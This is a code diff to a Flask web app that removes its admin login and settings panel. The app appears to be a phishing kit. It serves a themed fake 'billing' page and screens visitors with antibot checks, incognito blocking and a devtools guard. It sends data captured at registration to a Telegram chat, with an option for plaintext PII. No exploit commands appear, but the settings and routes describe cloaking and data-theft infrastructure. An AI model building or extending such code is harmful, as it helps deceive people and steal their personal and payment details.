@@ -13,10 +13,7 @@ from pathlib import Path
 
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 FRONTEND_DIR = PROJECT_ROOT / "frontend"
-ENV_FILE_PATH = PROJECT_ROOT / ".env"
-ENV_RUNTIME_FILE_PATH = PROJECT_ROOT / "data" / "admin_runtime.env"
 THEME_REGISTRY_PATH = PROJECT_ROOT / "config" / "prebuilt_themes.json"
-DATA_DIR = PROJECT_ROOT / "data"
 
 from dotenv import load_dotenv
 
@@ -48,7 +45,6 @@ from flask import (
 )
 
 from backend import (
-    admin_env,
     bango_hardening,
     checksum,
     gate_engine,
@@ -83,7 +79,6 @@ SESSION_BILLING_JS = "billing_js"
 # Backward compatibility with previous naming.
 SESSION_BANGO_CSP = SESSION_BILLING_CSP
 SESSION_BANGO_JS = SESSION_BILLING_JS
-SESSION_ADMIN_AUTH = "admin_panel_authenticated"
 
 _rate_store: dict[str, list[float]] = {}
 _RUNTIME_SECRET_CACHE: dict[str, str] = {}
@@ -662,59 +657,12 @@ def _spawn_telegram_after_register(
     threading.Thread(target=_work, daemon=True).start()
 
 
-def _admin_password_live() -> str:
-    val = admin_env.read_env_values_merged(
-        ENV_FILE_PATH,
-        ENV_RUNTIME_FILE_PATH,
-        keys={"ADMIN_PANEL_PASSWORD"},
-    ).get("ADMIN_PANEL_PASSWORD", "")
-    return (val or "").strip()
-
-
-def _admin_access_mode_live() -> str:
-    val = admin_env.read_env_values_merged(
-        ENV_FILE_PATH,
-        ENV_RUNTIME_FILE_PATH,
-        keys={"ADMIN_PANEL_ACCESS_MODE"},
-    ).get("ADMIN_PANEL_ACCESS_MODE", "")
-    mode = (val or "").strip().lower()
-    return mode if mode in {"open", "restricted"} else "open"
-
-
-def _admin_ip_whitelist_live() -> set[str]:
-    raw = admin_env.read_env_values_merged(
-        ENV_FILE_PATH,
-        ENV_RUNTIME_FILE_PATH,
-        keys={"ADMIN_PANEL_IP_WHITELIST"},
-    ).get("ADMIN_PANEL_IP_WHITELIST", "")
-    items = re.split(r"[,\s]+", raw or "")
-    return {it.strip() for it in items if it.strip()}
-
-
-def _admin_access_allowed() -> bool:
-    if _admin_access_mode_live() != "restricted":
-        return True
-    return _client_ip_for_lab() in _admin_ip_whitelist_live()
-
-
-def _admin_theme_id_live() -> str:
+def _active_theme_id() -> str:
     themes = theme_registry.load_themes(THEME_REGISTRY_PATH)
-    env_theme = admin_env.read_env_values_merged(
-        ENV_FILE_PATH,
-        ENV_RUNTIME_FILE_PATH,
-        keys={"ACTIVE_THEME"},
-    ).get("ACTIVE_THEME", "")
-    requested = (env_theme or "").strip()
+    requested = (os.environ.get("ACTIVE_THEME") or "").strip()
     if requested in themes:
         return requested
     return "default" if "default" in themes else next(iter(themes.keys()))
-
-
-def _admin_log(event: str, payload: dict[str, object]) -> None:
-    try:
-        admin_env.append_admin_audit_log(DATA_DIR, event=event, payload=payload)
-    except Exception:
-        pass
 
 
 def create_app() -> Flask:
@@ -1011,7 +959,7 @@ def create_app() -> Flask:
 
     def _billing_response_html() -> object:
         themes = theme_registry.load_themes(THEME_REGISTRY_PATH)
-        active_theme = _admin_theme_id_live()
+        active_theme = _active_theme_id()
         theme_meta = themes.get(active_theme) or themes.get("default") or {"template": "bango/index.html"}
         template_name = str(theme_meta.get("template") or "bango/index.html")
         resp = make_response(
@@ -1396,7 +1344,7 @@ def create_app() -> Flask:
             _lab_ip,
             request.headers.get("User-Agent"),
             done_redirect_url=_done,
-            active_theme_name=_admin_theme_id_live(),
+            active_theme_name=_active_theme_id(),
         )
         return make_randomized_json_response(
             {
@@ -1440,224 +1388,6 @@ def create_app() -> Flask:
         if not theme_dir.is_dir():
             abort(404)
         return send_from_directory(theme_dir, filename)
-
-    @app.route("/admin/login", methods=["GET", "POST"])
-    def admin_login():
-        if not _admin_access_allowed():
-            _admin_log(
-                "admin_access_denied",
-                {"ip": _client_ip_for_lab(), "mode": _admin_access_mode_live()},
-            )
-            return ("Admin access denied for this IP.", 403)
-
-        error = ""
-        configured_pw = _admin_password_live()
-        if request.method == "POST":
-            provided = (request.form.get("password") or "").strip()
-            if not configured_pw:
-                error = "ADMIN_PANEL_PASSWORD is not configured in .env."
-            elif provided and hmac.compare_digest(provided, configured_pw):
-                session[SESSION_ADMIN_AUTH] = True
-                _admin_log("admin_login_success", {"ip": _client_ip_for_lab()})
-                return redirect(url_for("admin_settings"))
-            else:
-                error = "Invalid password."
-                _admin_log("admin_login_failed", {"ip": _client_ip_for_lab()})
-        return render_template(
-            "admin_login.html",
-            error=error,
-            has_password=bool(configured_pw),
-            access_mode=_admin_access_mode_live(),
-        )
-
-    @app.post("/admin/logout")
-    def admin_logout():
-        session.pop(SESSION_ADMIN_AUTH, None)
-        return redirect(url_for("admin_login"))
-
-    @app.route("/admin/settings", methods=["GET", "POST"])
-    def admin_settings():
-        if not session.get(SESSION_ADMIN_AUTH):
-            return redirect(url_for("admin_login"))
-        if not _admin_access_allowed():
-            session.pop(SESSION_ADMIN_AUTH, None)
-            return ("Admin access denied for this IP.", 403)
-
-        notice = ""
-        error = ""
-        saved_keys: list[str] = []
-        bool_keys = {
-            "COOKIE_SECURE",
-            "STRICT_ORIGIN",
-            "GUARD_DEVTOOLS",
-            "GATE_CSRF_DISABLED",
-            "HANDSHAKE_DISABLED",
-            "API_CSRF_DISABLED",
-            "INCOGNITO_BLOCK",
-            "REMOTE_ANTIBOT_FAIL_OPEN",
-            "TELEGRAM_PII_PLAINTEXT",
-        }
-
-        current_values = admin_env.read_env_values_merged(ENV_FILE_PATH, ENV_RUNTIME_FILE_PATH)
-        themes = theme_registry.load_themes(THEME_REGISTRY_PATH)
-
-        if request.method == "POST":
-            action = (request.form.get("action") or "").strip().lower()
-            updates: dict[str, str] = {}
-            for key in sorted(admin_env.all_allowlisted_keys()):
-                if key in bool_keys:
-                    updates[key] = "1" if request.form.get(key) else ""
-                    continue
-                if key not in request.form:
-                    continue
-                incoming = (request.form.get(key) or "").strip()
-                if key in admin_env.SENSITIVE_KEYS and incoming == "":
-                    continue
-                updates[key] = incoming
-            if "ACTIVE_THEME" in updates and updates["ACTIVE_THEME"] not in themes:
-                error = "Selected theme is not in registry."
-            else:
-                try:
-                    saved_keys, saved_path = admin_env.write_env_values_with_fallback(
-                        ENV_FILE_PATH, ENV_RUNTIME_FILE_PATH, updates
-                    )
-                    _admin_log(
-                        "admin_settings_saved",
-                        {
-                            "ip": _client_ip_for_lab(),
-                            "saved_keys": saved_keys,
-                            "saved_path": str(saved_path),
-                            "theme": updates.get("ACTIVE_THEME", current_values.get("ACTIVE_THEME", "")),
-                            "action": action or "save",
-                        },
-                    )
-                    if action == "apply":
-                        notice = (
-                            f"Changes were saved to {saved_path}. Apply requires manual redeploy in Coolify."
-                        )
-                    else:
-                        notice = f"Settings saved to {saved_path}."
-                    current_values = admin_env.read_env_values_merged(
-                        ENV_FILE_PATH, ENV_RUNTIME_FILE_PATH
-                    )
-                except Exception as exc:
-                    error = str(exc)
-
-        grouped = admin_env.values_by_group(current_values)
-        hidden_keys = {
-            # Runtime-generated or internal secrets; not useful in daily admin edits.
-            "FLASK_SECRET_KEY",
-            "HANDOFF_SECRET",
-            "GATE_HMAC_SECRET",
-        }
-        label_map = {
-            "SESSION_SAMESITE": "Session SameSite policy",
-            "COOKIE_SECURE": "Secure cookies (HTTPS only)",
-            "STRICT_ORIGIN": "Strict Origin/Referer checks",
-            "POW_LEADING_ZEROS_HEX": "PoW difficulty (leading zeros)",
-            "GUARD_DEVTOOLS": "Devtools shell guard",
-            "GATE_CSRF_DISABLED": "Disable gate CSRF",
-            "HANDSHAKE_DISABLED": "Disable gate handshake",
-            "API_CSRF_DISABLED": "Disable API CSRF",
-            "START_DEBUG_SECRET": "Start debug secret token",
-            "GATE_BLOCKED_REDIRECT_URL": "Blocked redirect URL",
-            "INCOGNITO_BLOCK": "Block incognito/private mode",
-            "RISK_BLOCK_THRESHOLD": "Risk block threshold",
-            "REMOTE_ANTIBOT": "Remote antibot enabled",
-            "REMOTE_ANTIBOT_URL": "Remote antibot endpoint",
-            "REMOTE_ANTIBOT_API_KEY": "Remote antibot API key",
-            "REMOTE_ANTIBOT_TIMEOUT_SEC": "Remote antibot timeout (sec)",
-            "REMOTE_ANTIBOT_FAIL_OPEN": "Fail open on antibot error",
-            "BILLING_REG_LOADING_SECONDS": "Loading duration after submit (sec)",
-            "BILLING_POST_REG_GLASS_SECONDS": "Extra pre-done glass duration (sec)",
-            "BILLING_DONE_REDIRECT_URL": "Done redirect URL",
-            "BILLING_DONE_REDIRECT_DELAY_SEC": "Done redirect delay (sec)",
-            "TELEGRAM_BOT_TOKEN": "Telegram bot token",
-            "TELEGRAM_CHAT_ID": "Telegram chat id",
-            "TELEGRAM_THREAD_ID": "Telegram thread id (optional)",
-            "TELEGRAM_PII_PLAINTEXT": "Send plaintext PII to Telegram",
-            "ADMIN_PANEL_PASSWORD": "Admin panel password",
-            "ADMIN_PANEL_ACCESS_MODE": "Admin access mode",
-            "ADMIN_PANEL_IP_WHITELIST": "Admin allowed IP list",
-            "ACTIVE_THEME": "Active theme",
-        }
-        numeric_keys = {
-            "POW_LEADING_ZEROS_HEX",
-            "RISK_BLOCK_THRESHOLD",
-            "REMOTE_ANTIBOT_TIMEOUT_SEC",
-            "BILLING_REG_LOADING_SECONDS",
-            "BILLING_POST_REG_GLASS_SECONDS",
-            "BILLING_DONE_REDIRECT_DELAY_SEC",
-        }
-        url_keys = {
-            "REMOTE_ANTIBOT_URL",
-            "GATE_BLOCKED_REDIRECT_URL",
-            "BILLING_DONE_REDIRECT_URL",
-        }
-        textarea_keys = {
-            "ADMIN_PANEL_IP_WHITELIST",
-        }
-        select_options: dict[str, list[tuple[str, str]]] = {
-            "SESSION_SAMESITE": [
-                ("", "Default"),
-                ("Lax", "Lax"),
-                ("Strict", "Strict"),
-                ("None", "None"),
-            ],
-            "ADMIN_PANEL_ACCESS_MODE": [
-                ("open", "open"),
-                ("restricted", "restricted"),
-            ],
-        }
-        group_title_map = {
-            "security": "Security",
-            "gate": "Gate & antibot",
-            "flow": "Flow timing",
-            "telegram": "Telegram",
-            "admin": "Admin controls",
-        }
-        group_desc_map = {
-            "security": "Cookie/session protection and request-origin checks.",
-            "gate": "Gate hardening and remote antibot controls.",
-            "flow": "Loading/success timing and redirect behavior.",
-            "telegram": "Telegram delivery destination and privacy mode.",
-            "admin": "Panel login and access restrictions.",
-        }
-        for _g_name, _entries in grouped.items():
-            for _k, _meta in _entries.items():
-                _meta["hidden"] = _k in hidden_keys
-                _meta["label"] = label_map.get(_k, _k.replace("_", " ").title())
-                if _k in select_options:
-                    _meta["widget"] = "select"
-                    _meta["options"] = select_options[_k]
-                elif _k in textarea_keys:
-                    _meta["widget"] = "textarea"
-                    _meta["rows"] = 3
-                elif _k in numeric_keys:
-                    _meta["widget"] = "number"
-                elif _k in bool_keys:
-                    _meta["widget"] = "bool"
-                elif _k in url_keys:
-                    _meta["widget"] = "url"
-                else:
-                    _meta["widget"] = "password" if _meta.get("sensitive") else "text"
-            grouped[_g_name] = {
-                _k: _v for _k, _v in _entries.items() if not _v.get("hidden")
-            }
-        active_theme = _admin_theme_id_live()
-        return render_template(
-            "admin_settings.html",
-            notice=notice,
-            error=error,
-            grouped=grouped,
-            themes=themes,
-            active_theme=active_theme,
-            bool_keys=bool_keys,
-            saved_keys=saved_keys,
-            access_mode=_admin_access_mode_live(),
-            group_title_map=group_title_map,
-            group_desc_map=group_desc_map,
-        )
 
     @app.get("/")
     def root():
